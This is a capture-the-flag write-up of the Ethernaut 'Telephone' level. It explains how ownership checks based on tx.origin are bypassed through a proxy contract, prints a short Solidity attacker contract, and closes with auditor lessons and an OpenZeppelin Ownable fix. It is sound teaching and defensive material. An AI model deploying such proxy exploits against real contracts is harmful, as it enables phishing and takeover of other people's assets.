---
title: 'Ethernaut - Telephone'
description: 'Understanding the critical security distinction between tx.origin and msg.sender. Learn how tx.origin authentication can be bypassed using simple contract proxying.'
date: 2025-07-04
tags: ['solidity', 'security', 'phishing', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# ☎️ Telephone - The tx.origin Trap

## Challenge Overview

The objective of this level is to **claim ownership** of the `Telephone` contract.

**The Catch:** The `changeOwner()` function seems to be protected by a conditional statement checking who is making the call. We must satisfy this condition to gain control.

---

## Technical Analysis

### Vulnerability: Authentication via `tx.origin`

The security barrier in `Telephone` relies on a check comparing `tx.origin` and `msg.sender`:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

#### The Root Cause
The core vulnerability is a misunderstanding of how the Ethereum Virtual Machine (EVM) tracks callers:
*   **`tx.origin`**: The Externally Owned Account (EOA) that originally signed and initiated the transaction. This value **never changes** throughout the entire call stack of the transaction.
*   **`msg.sender`**: The immediate caller of the current execution context. This value **changes** every time a contract calls another contract.

If an EOA directly calls `changeOwner()`, then `tx.origin == msg.sender` (both are the EOA). However, if the EOA calls an intermediate contract (Proxy), which in turn calls `changeOwner()`:
1. `tx.origin` remains the EOA address.
2. `msg.sender` in `Telephone` becomes the Proxy contract's address.
3. Therefore, `tx.origin != msg.sender`, the condition is satisfied, and the owner is updated to whatever address we choose.

---

## The Exploit: The Multi-Step Solution

1. **Deploy an Attack Contract**: Deploy a helper contract that has a function to call `Telephone.changeOwner(player)`.
2. **Execute the Attack**: Call the attack function from our player EOA.
3. **Takeover Complete**: The check `tx.origin != msg.sender` evaluates to `true`, and we are registered as the new owner.

---

## Proof of Concept (PoC)

Below is the Solidity exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone public immutable target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack() external {
        // tx.origin will be msg.sender (the player EOA calling this function)
        // msg.sender inside Telephone will be this contract's address
        target.changeOwner(msg.sender);
    }
}
```

---

## Auditor's Lessons

1. **Never Use `tx.origin` for Authentication**: Using `tx.origin` for authorization makes a contract highly vulnerable to phishing attacks. If a user is tricked into calling a malicious contract, that contract can forward calls to the vulnerable contract, authorizing actions using the victim's authority.
2. **Understand the Call Stack**: `msg.sender` is the gold standard for tracking who called the current function, but you must always account for intermediate contracts, multisig wallets, and forwarders.
3. **Legitimate Uses of `tx.origin`**: `tx.origin` is rarely used in modern security but can be useful to enforce that the caller is an EOA (e.g., `require(msg.sender == tx.origin)`), though this can break compatibility with smart contract wallets (like Safe).

---

## Remediation

Remove `tx.origin` checks and replace them with standard ownership modifier patterns (e.g., OpenZeppelin `Ownable`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureTelephone is Ownable {
    constructor() Ownable(msg.sender) {}

    // Explicitly restrict access using the onlyOwner modifier
    function changeOwner(address _newOwner) public onlyOwner {
        transferOwnership(_newOwner);
    }
}
```
